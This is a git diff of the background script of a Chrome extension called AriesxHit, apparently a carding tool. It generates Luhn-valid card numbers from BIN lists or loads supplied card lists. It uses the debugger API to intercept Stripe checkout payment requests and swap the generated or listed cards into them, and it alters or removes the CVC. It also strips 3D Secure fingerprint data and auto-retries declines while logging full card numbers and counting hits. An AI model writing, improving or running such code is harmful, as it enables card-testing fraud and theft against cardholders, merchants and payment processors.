@@ -1,10 +1,11 @@
 // ===================================
 // BACKGROUND.JS
-// AriesxHit - No Debugger, Content Script Based
+// AriesxHit - WebRequest + Debugger API
 // ===================================
 
-// ==================== INLINE UTILITIES (Service Worker) ====================
-const State = {
+// ==================== STATE ====================
+
+const state = {
   binList: [],
   cardList: [],
   currentBinIndex: 0,
@@ -46,9 +47,8 @@ const CardGen = {
 
     // Pad to 16 if needed
     let pattern = binPattern;
-
     if (pattern.length < 16) {
-        pattern += 'x'.repeat(16 - pattern.length);
+      pattern += 'x'.repeat(16 - pattern.length);
     }
 
     // Generate number
@@ -69,9 +69,8 @@ const CardGen = {
     };
   },
 
-    fixLuhn(num) {
+  fixLuhn(num) {
     const digits = num.split('').map(Number);
-    
     let sum = 0;
     for (let i = 0; i < 15; i++) {
       let d = digits[i];
@@ -81,12 +80,11 @@ const CardGen = {
       }
       sum += d;
     }
-
     const check = (10 - (sum % 10)) % 10;
     return num.slice(0, 15) + check;
   },
 
-    genMonth(m) {
+  genMonth(m) {
     if (m && /^\d{1,2}$/.test(m)) {
       const month = parseInt(m);
       if (month >= 1 && month <= 12) return month.toString().padStart(2, '0');
@@ -94,7 +92,7 @@ const CardGen = {
     return (Math.floor(Math.random() * 12) + 1).toString().padStart(2, '0');
   },
 
-    genYear(y) {
+  genYear(y) {
     const now = new Date().getFullYear();
     if (y && /^\d{2,4}$/.test(y)) {
       let year = parseInt(y);
@@ -115,7 +113,6 @@ const CardGen = {
 };
 
 // ==================== INIT ====================
-
 
 chrome.storage.local.get([
   'binList', 'cardList', 'logs', 'stats',
@@ -148,8 +145,7 @@ chrome.storage.onChanged.addListener((changes) => {
 });
 
 // ==================== WEBREQUEST API ====================
-// Used for: Observing requests, blocking analytics, detecting checkout
-
+// Used for: Observing requests, detecting checkout, triggering debugger attach
 
 chrome.webRequest.onBeforeRequest.addListener(
   (details) => {
@@ -167,15 +163,13 @@ chrome.webRequest.onBeforeRequest.addListener(
       }
     }
 
-    
     // Detect payment request - attach debugger
     if (url.includes('stripe.com/v1/payment_methods') || url.includes('stripe.com/v1/tokens')) {
       if (!debuggerAttachedTabs.has(details.tabId) && details.tabId > 0) {
         attachDebugger(details.tabId);
       }
     }
-    
-
+  },
   { urls: ['*://*.stripe.com/*'] }
 );
 
@@ -192,10 +186,8 @@ chrome.webRequest.onCompleted.addListener(
         log('warning', '🔒 3D Secure Detected');
       }
     }
-
   },
   { urls: ['*://*.stripe.com/*'] }
-
 );
 
 // ==================== DEBUGGER API ====================
@@ -236,16 +228,13 @@ chrome.debugger.onEvent.addListener((source, method, params) => {
   } else if (method === 'Network.responseReceived') {
     handleNetworkResponse(tabId, params);
   }
-  
 });
-
 
 chrome.debugger.onDetach.addListener((source) => {
   debuggerAttachedTabs.delete(source.tabId);
 });
 
 // ==================== REQUEST MODIFICATION ====================
-
 
 async function handleFetchPaused(tabId, params) {
   const { requestId, request } = params;
@@ -257,15 +246,12 @@ async function handleFetchPaused(tabId, params) {
     chrome.debugger.sendCommand({ tabId }, 'Fetch.continueRequest', { requestId });
     return;
   }
-});
-
   
   // Check if bypass/autohit is active
   if (!state.bypassActive && !state.autoHitActive) {
     chrome.debugger.sendCommand({ tabId }, 'Fetch.continueRequest', { requestId });
     return;
   }
-
   
   // Get card
   const card = await getCard(tabId);
@@ -292,12 +278,11 @@ async function handleFetchPaused(tabId, params) {
   }
   
   // === CVC MODIFIER ===
-  const cvcResult = applyCvc(card.cvv, body);
+  applyCvc(card.cvv, body);
   
   // === 3DS BYPASS ===
   if (state.settings.remove3dsFingerprint) {
     bypass3ds(body);
-
   }
 
   // === REMOVE PAYMENT AGENT ===
@@ -330,9 +315,19 @@ async function handleFetchPaused(tabId, params) {
       }
     }
   }
-
   
   const postDataBase64 = btoa(unescape(encodeURIComponent(newBody)));
+  
+  // Log BEFORE sending - "Trying Card" in yellow style
+  const cvcName = { remove: 'Remove', generate: 'Generate', nothing: 'Nothing', custom: 'Custom' }[state.settings.cvcModifier] || 'Generate';
+  const fullCard = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
+  
+  // Log as 'trying' type for yellow color
+  log('trying', `Trying Card :- ${fullCard}`);
+  log('info', `[CVC: ${cvcName}]`);
+  
+  // Store card for this tab
+  tabCardDetailsMap.set(tabId, card);
   
   // Send modified request
   chrome.debugger.sendCommand({ tabId }, 'Fetch.continueRequest', {
@@ -341,14 +336,6 @@ async function handleFetchPaused(tabId, params) {
     postData: postDataBase64,
     headers
   }, () => {
-    // Store card for this tab
-    tabCardDetailsMap.set(tabId, card);
-    
-    // Log
-    const cvcName = { remove: 'Remove', generate: 'Generate', nothing: 'Nothing', custom: 'Custom' }[state.settings.cvcModifier] || 'Generate';
-    const fullCard = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
-    log('info', `💳 ${fullCard} (gen) [CVC: ${cvcName}]`);
-    
     notifyTab(tabId, { 
       type: 'show_notification', 
       message: `💳 ${card.number.slice(0,6)}****${card.number.slice(-4)}`, 
@@ -357,14 +344,10 @@ async function handleFetchPaused(tabId, params) {
     
     state.stats.tested++;
     chrome.storage.local.set({ stats: state.stats });
-    
-    // Auto retry
-    triggerRetry(tabId);
   });
 }
 
 // ==================== RESPONSE HANDLING ====================
-
 
 function handleNetworkResponse(tabId, params) {
   const { requestId, response } = params;
@@ -381,13 +364,10 @@ function handleNetworkResponse(tabId, params) {
     try {
       const bodyStr = result.base64Encoded ? atob(result.body) : result.body;
       const data = JSON.parse(bodyStr);
-      
       processResponse(tabId, data);
     } catch (e) {
       console.log('Response parse error:', e);
     }
-    
-    triggerRetry(tabId);
   });
 }
 
@@ -400,13 +380,13 @@ function processResponse(tabId, data) {
   // Check for 3DS requirement
   if (data.status === 'requires_action' || data.next_action) {
     tabCheckoutType.set(tabId, '3d');
-    log('warning', '🔐 Stripe: 3D Secure Required');
+    log('warning', '🔐 3D Secure Required');
     notifyTab(tabId, { type: 'UPDATE_CHECKOUT_TYPE', checkoutType: '3d' });
     notifyTab(tabId, { type: 'show_notification', message: '🔐 3D Secure Required', messageType: 'warning' });
     return;
   }
   
-  // Check for errors
+  // Check for errors - RED color
   const error = data.error || data.payment_intent?.last_payment_error;
   if (error) {
     const code = error.decline_code || error.code || 'declined';
@@ -414,16 +394,18 @@ function processResponse(tabId, data) {
     notifyTab(tabId, { type: 'show_notification', message: `❌ ${code}`, messageType: 'error' });
     state.stats.declined++;
     chrome.storage.local.set({ stats: state.stats });
+    
+    // Trigger retry if user clicked submit
+    triggerRetry(tabId);
     return;
   }
   
-  // Check for success
+  // Check for success - GREEN color
   const status = data.status?.toLowerCase();
   if (status === 'succeeded' || status === 'success') {
     handleSuccess(tabId);
   }
 }
-
 
 function handleSuccess(tabId) {
   const card = tabCardDetailsMap.get(tabId);
@@ -448,9 +430,8 @@ function handleSuccess(tabId) {
 
 // ==================== CARD LOGIC ====================
 
-
 async function getCard(tabId) {
-  // From card list
+  // From card list (Auto Hit mode)
   if (state.cardList?.length > 0) {
     let idx = tabCardIndexMap.get(tabId) || 0;
     if (idx >= state.cardList.length) return null;
@@ -460,7 +441,7 @@ async function getCard(tabId) {
     return { number, month, year, cvv };
   }
   
-  // From BIN list
+  // From BIN list (Bypass mode)
   if (state.binList?.length > 0) {
     const bin = state.binList[state.currentBinIndex % state.binList.length];
     state.currentBinIndex++;
@@ -490,7 +471,6 @@ function applyCvc(originalCvv, body) {
         break;
     }
   }
-
 }
 
 function bypass3ds(body) {
@@ -519,9 +499,7 @@ function bypass3ds(body) {
   }
 }
 
-
 // ==================== RETRY ====================
-
 
 function triggerRetry(tabId) {
   if (state.userClickedSubmit && !state.retryInProgress) {
@@ -536,7 +514,6 @@ function triggerRetry(tabId) {
 }
 
 // ==================== TAB MANAGEMENT ====================
-
 
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
   if (tab.url?.includes('cs_live') || tab.url?.includes('buy.stripe.com') || tab.url?.includes('checkout.stripe.com')) {
@@ -574,7 +551,6 @@ function injectScripts(tabId) {
 
 // ==================== UTILITIES ====================
 
-
 function log(type, message) {
   const entry = { type, message, timestamp: Date.now() };
   state.logs.push(entry);
@@ -587,13 +563,11 @@ function notifyTab(tabId, msg) {
   chrome.tabs.sendMessage(tabId, msg).catch(() => {});
 }
 
-// ==================== PERMISSION CHECKS ====================
-
 function broadcast(msg) {
   chrome.runtime.sendMessage(msg).catch(() => {});
 }
 
-// ==================== MESSAGES ====================
+// ==================== MESSAGE HANDLER ====================
 
 chrome.runtime.onMessage.addListener((msg, sender, respond) => {
   const tabId = sender.tab?.id;
@@ -601,12 +575,6 @@ chrome.runtime.onMessage.addListener((msg, sender, respond) => {
   switch (msg.type) {
     case 'user_clicked_submit':
       state.userClickedSubmit = true;
-      respond({ success: true });
-      break;
-
-    case 'STOP_AUTO_HIT':
-      state.autoHitActive = false;
-      addLog('info', '⏹️ Auto Hit OFF');
       respond({ success: true });
       break;
 
@@ -662,6 +630,10 @@ chrome.runtime.onMessage.addListener((msg, sender, respond) => {
       respond({ settings: state.settings });
       break;
 
+    case 'GET_LOGS':
+      respond({ logs: state.logs, stats: state.stats });
+      break;
+
     case 'CLEAR_LOGS':
       state.logs = [];
       chrome.storage.local.set({ logs: [] });
@@ -680,8 +652,6 @@ chrome.runtime.onMessage.addListener((msg, sender, respond) => {
       respond({ active: state.bypassActive });
       break;
 
-
-    // ===== CHECKOUT DETECTION =====
     case 'CHECKOUT_DETECTED':
       if (tabId) tabCheckoutType.set(tabId, msg.checkoutType || '2d');
       log('info', `🔍 ${(msg.checkoutType || '2d').toUpperCase()} Checkout`);
@@ -711,11 +681,7 @@ chrome.action.onClicked.addListener(async () => {
     chrome.tabs.create({ 
       url: chrome.runtime.getURL(auth.auth_token ? 'popup.html' : 'login.html') 
     });
-
   }
-  
 });
 
 console.log('[AriesxHit] Background Ready - WebRequest + Debugger API');
-
-
